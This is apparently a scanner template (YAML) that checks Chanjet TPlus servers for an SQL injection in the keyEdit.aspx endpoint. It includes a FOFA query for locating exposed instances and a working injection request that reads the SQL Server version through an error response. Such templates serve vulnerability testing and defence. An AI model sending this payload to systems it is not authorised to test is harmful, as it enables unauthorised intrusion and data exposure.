id: changjietong-tplus-keyedit-sqli

info:
  name: 畅捷通TPlus-keyEdit.aspx-SQL注入漏洞
  author: avic123
  severity: high
  verified: true
  description: |-
    该系统的keyEdit.aspx接口存在sql注入漏洞
    fofa: app="畅捷通-TPlus"
  reference:
    - https://blog.csdn.net/weixin_43981050/article/details/138958397
  tags: changjietong,sqli
  created: 2025/08/29

set:
  hostname: request.url.host

rules:
  r0:
    request:
      method: GET
      path: /tplus/UFAQD/keyEdit.aspx?KeyID=222%27%20and%201=(select%20@@version)%20--&preload=1
    expression: >-
      response.status == 500 && response.body.bcontains(b"Microsoft SQL Server")

expression: r0()
